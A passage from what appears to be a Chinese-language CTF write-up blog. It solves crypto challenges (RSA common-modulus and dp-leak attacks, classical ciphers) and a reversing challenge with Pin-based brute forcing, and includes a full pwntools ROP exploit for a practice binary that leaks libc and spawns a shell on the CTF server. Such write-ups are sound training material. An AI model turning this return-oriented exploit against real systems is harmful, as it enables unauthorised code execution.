         &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> target[] = &#123; <span class="number">8</span>,<span class="number">0xEA</span>,<span class="number">0x58</span>,<span class="number">0xDE</span>,<span class="number">0x94</span>,<span class="number">0xD0</span>,<span class="number">0x3B</span>,<span class="number">-66</span>,<span class="number">-120</span>,<span class="number">-44</span>,<span class="number">50</span>,<span class="number">-74</span>,<span class="number">20</span>,<span class="number">-126</span>,<span class="number">-73</span>,<span class="number">-81</span>,<span class="number">20</span>,<span class="number">84</span>,<span class="number">127</span>,<span class="number">-49</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">51</span>,<span class="number">34</span>,<span class="number">51</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">51</span>,<span class="number">34</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">36</span>,<span class="number">32</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> tt[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(flag,<span class="string">&quot;swpuctf&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">size_t</span> cnt=<span class="built_in">strlen</span>(flag),cnt2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(cnt&lt;<span class="number">32</span>)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(tt,&amp;target[cnt2],<span class="number">4</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;tt[<span class="number">4</span>],&amp;target[cnt2+<span class="number">20</span>],<span class="number">4</span>);</span><br><span class="line">        brute(&amp;flag[cnt],tt);</span><br><span class="line">        cnt+=<span class="number">4</span>;</span><br><span class="line">        flag[cnt++]=<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">        cnt2+=<span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    flag[<span class="number">32</span>]=<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Crypto-old-fashion"><a href="#Crypto-old-fashion" class="headerlink" title="[Crypto]old-fashion"></a>[Crypto]old-fashion</h2><p>quipquip.com一把梭</p>
<h2 id="Crypto-萌萌哒的八戒"><a href="#Crypto-萌萌哒的八戒" class="headerlink" title="[Crypto]萌萌哒的八戒"></a>[Crypto]萌萌哒的八戒</h2><p>猪圈密码，使用不同的符号代替之前的符号</p>
<p><a target="_blank" rel="noopener" href="http://www.metools.info/code/c90.html">http://www.metools.info/code/c90.html</a></p>
<h2 id="Crypto-BJDCTF-2nd-灵能精通-y1ng"><a href="#Crypto-BJDCTF-2nd-灵能精通-y1ng" class="headerlink" title="[Crypto][BJDCTF 2nd]灵能精通-y1ng"></a>[Crypto][BJDCTF 2nd]灵能精通-y1ng</h2><p>圣堂武士密码<a target="_blank" rel="noopener" href="https://www.tuicool.com/articles/2E3INnm">https://www.tuicool.com/articles/2E3INnm</a></p>
<p>IMKNIGHTSTEMPLAR</p>
<h2 id="crypto-RSA3"><a href="#crypto-RSA3" class="headerlink" title="[crypto]RSA3"></a>[crypto]RSA3</h2><p>原来这就是共模攻击，学到了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">c1=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">c2=<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line"></span><br><span class="line">g,x,y = gmpy2.gcdext(e1,e2)</span><br><span class="line">print(long_to_bytes((gmpy2.powmod(c1,x,n)*gmpy2.powmod(c2,y,n))%n))</span><br></pre></td></tr></table></figure>

<h2 id="crypto-RSA2"><a href="#crypto-RSA2" class="headerlink" title="[crypto]RSA2"></a>[crypto]RSA2</h2><p>$dp=d\mod (p-1)$</p>
<p>$ed=1\mod (p-1)(q-1)$</p>
<p>$k_1(p-1)+dp=d$</p>
<p>$k_2*(p-1)(q-1)+ed=1$</p>
<p>$\therefore k_2(p-1)+ek_1(p-1)+edp=1$</p>
<p>两边同时对p-1取模$edp\mod (p-1)=1$</p>
<p>$edp=k(p-1)+1$</p>
<p>$k=\frac{edp-1}{p-1}\lt e(\frac{dp-1}{p-1}-\frac{1}{p-1})$</p>
<p>由于$dp$位于[0,p-2]，所以$k\lt e$，可以穷举</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line">k = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(e,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">    k = i</span><br><span class="line">    <span class="keyword">if</span> (e*dp<span class="number">-1</span>)%k==<span class="number">0</span>:</span><br><span class="line">        p = (e*dp<span class="number">-1</span>)//k+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">p = (e*dp<span class="number">-1</span>)//k+<span class="number">1</span></span><br><span class="line">q = n//p</span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(long_to_bytes(gmpy2.powmod(c,d,n)))</span><br></pre></td></tr></table></figure>

<h2 id="pwn-ciscn-2019-en-2"><a href="#pwn-ciscn-2019-en-2" class="headerlink" title="[pwn]ciscn_2019_en_2"></a>[pwn]ciscn_2019_en_2</h2><p>encrypt函数中有个可以利用的点，s是可以溢出的</p>
<p>payload构造过程</p>
<p>0x60207a</p>
<ol>
<li>pop rdi,ret;命令用于参数</li>
<li>使用gets读入/bin/sh字符串</li>
<li>使用puts输出puts的got表信息</li>
<li>计算出system的地址，直接call</li>
<li>调用顺序 pop_rdi-&gt;gets-&gt;puts-&gt;encrypt-&gt;system</li>
<li>需要注意还有个变换</li>
</ol>
<p>payload 如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26231</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span>(<span class="params">a</span>):</span></span><br><span class="line"></span><br><span class="line">    r = [i <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(r)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r[i]&gt;=<span class="number">97</span> <span class="keyword">and</span> r[i]&lt;<span class="number">97</span>+<span class="number">26</span>:</span><br><span class="line"></span><br><span class="line">            r[i]^=<span class="number">0xe</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> r[i]&gt;=<span class="number">65</span> <span class="keyword">and</span> r[i]&lt;<span class="number">65</span>+<span class="number">26</span>:</span><br><span class="line"></span><br><span class="line">            r[i]^=<span class="number">0xd</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> r[i]&gt;=<span class="number">48</span> <span class="keyword">and</span> r[i]&lt;<span class="number">58</span>:</span><br><span class="line"></span><br><span class="line">            r[i]^=<span class="number">0xc</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">puts = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x6020a8</span></span><br><span class="line"></span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">encrypt = elf.symbols[<span class="string">&#x27;encrypt&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pad = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;puts_got: %x,puts_symbols: %x&#x27;</span>%(puts_got,puts))</span><br><span class="line"></span><br><span class="line">payload = pad+p64(pop_rdi)+p64(binsh)+p64(gets)+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(encrypt)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = p.recvuntil(<span class="string">&#x27;Input&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r[<span class="number">-12</span>:<span class="number">-6</span>]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7f23ce026590</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;puts_addr:0x%x&#x27;</span>%puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;libc_base:0x%x\n&quot;</span>%libc_base)</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;system_addr:0x%x&#x27;</span>%system)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = pad+p64(pop_rdi)+p64(binsh)+p64(system)+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>555终于打通了，另外那个/bin/sh字符串可以似乎用libc的</p>
<h2 id="rev-INSHack2017-secure-garden-shed-v1"><a href="#rev-INSHack2017-secure-garden-shed-v1" class="headerlink" title="[rev][INSHack2017]secure-garden-shed-v1"></a>[rev][INSHack2017]secure-garden-shed-v1</h2><ol>
<li>判断文件头</li>
<li>寻找code段和data段，并进行了解密</li>
<li>进行跳转，1a20-&gt;1c20-&gt;1bfc-&gt;1b38-&gt;1b24-&gt;1ce0-&gt;1b9c-&gt;1a98-&gt;1a24-&gt;1a98-&gt;1e5c-&gt;1d24-&gt;1ce0-&gt;1e5c-&gt;1d24-&gt;1ce0-&gt;1b38-&gt;1b00</li>
<li>1b9c中有输入，1b38中有输出，合理推测1bfc中是解密输出字符串</li>
<li>1b38中有错误提示</li>
<li>输入的数据在0x5655b1a0</li>
</ol>
<p>data段解密流程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dataSegLen )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j != dataSegLen; ++j )</span><br><span class="line">        *(_BYTE *)(fileMapPtr_1 + dataSegOff + j + <span class="number">5</span>) ^= *(_BYTE *)(fileMapPtr_1 + j % v12 + <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>既然每次读入一个字符，那就是按位验证，又看到错误情况下指令数和基本块数相等，pin爆破</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;gmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag&#123;39b0ff847f1f4404aa6c7742d20363e9&#125;</span></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">256</span>] = <span class="string">&quot;thisisastrongpassphrasebecauseitisreallylong&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">getBblCount</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(input[i]&lt;<span class="number">48</span>||input[i]&gt;<span class="number">58</span>)i++;</span><br><span class="line">    <span class="keyword">while</span>(input[i])&#123;</span><br><span class="line">        res=res*<span class="number">10</span>+input[i]<span class="number">-48</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">set</span>[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;/&quot;</span>;</span><br><span class="line">    <span class="keyword">size_t</span> scope = <span class="built_in">strlen</span>(<span class="built_in">set</span>);</span><br><span class="line">    <span class="keyword">size_t</span> len = <span class="built_in">strlen</span>(flag);</span><br><span class="line">    <span class="keyword">char</span> cmd[<span class="number">1024</span>] = <span class="string">&quot;.echo %s | ./pp&quot;</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd,<span class="string">&quot;echo %s &quot;</span>,flag);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> bblCount,insCount,last;</span><br><span class="line">    <span class="comment">// memset(flag,0,256);</span></span><br><span class="line">    <span class="keyword">size_t</span> start = <span class="built_in">strlen</span>(flag);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i1=start;i1&lt;<span class="number">128</span>;i1++)&#123;</span><br><span class="line">        last=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i2=<span class="number">0</span>;i2&lt;scope;i2++)&#123;</span><br><span class="line">            flag[i1]=<span class="built_in">set</span>[i2];</span><br><span class="line">            <span class="built_in">sprintf</span>(cmd,<span class="string">&quot;echo \&quot;%s\&quot; | ./pin -t MyPinTool32.so -- ./sgs-exec-release ./lock.sgsc&quot;</span>,flag);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;i1: %d/%d, i2: %d/%d,%s,%s\n&quot;</span>,i1,scope,i2,scope,flag,cmd);</span><br><span class="line">            f = popen(cmd,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">            fgets(buf,<span class="number">256</span>,f);</span><br><span class="line">            fgets(buf,<span class="number">256</span>,f);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">            <span class="keyword">if</span>(buf[<span class="number">0</span>]!=<span class="string">&#x27;S&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            fgets(buf,<span class="number">256</span>,f);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">            bblCount = getBblCount(buf);</span><br><span class="line">            fgets(buf,<span class="number">256</span>,f);</span><br><span class="line">            pclose(f);</span><br><span class="line">            <span class="comment">// insCount = getIns</span></span><br><span class="line">            <span class="keyword">if</span>(last&amp;&amp;bblCount&gt;last)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(last&gt;bblCount)&#123;</span><br><span class="line">                flag[i1]=<span class="built_in">set</span>[i2<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                last=bblCount;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    check();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意编译MyPinTool.so的时候命令是32位的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make TARGET=intel64 <span class="comment"># x64</span></span><br><span class="line">make TARGET=ia32 <span class="comment"># x32</span></span><br></pre></td></tr></table></figure>
<p>直接爆破出flag，输入是</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thisisastrongpassphrasebecauseitisreallylongandrandomattheenduoiiencger</span><br></pre></td></tr></table></figure>
<p>好家伙真够长的</p>
<p>阿哲，大佬直接搜索字符串了555</p>
<p>尝试解密文件，原来是这样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printA</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        print(hex(i),end=<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    print()</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;lock.sgsc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">dataSeg = <span class="number">0</span></span><br><span class="line">codeSeg = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">    <span class="keyword">if</span> data[i]==ord(<span class="string">&#x27;c&#x27;</span>) <span class="keyword">and</span> data[i+<span class="number">1</span>]==ord(<span class="string">&#x27;o&#x27;</span>) <span class="keyword">and</span> data[i+<span class="number">2</span>]==ord(<span class="string">&#x27;d&#x27;</span>):</span><br><span class="line">        codeSeg=i<span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">    <span class="keyword">if</span> data[i]==ord(<span class="string">&#x27;d&#x27;</span>) <span class="keyword">and</span> data[i+<span class="number">1</span>]==ord(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> data[i+<span class="number">2</span>]==ord(<span class="string">&#x27;t&#x27;</span>):</span><br><span class="line">        dataSeg=i<span class="number">-1</span></span><br><span class="line">dataS = []</span><br><span 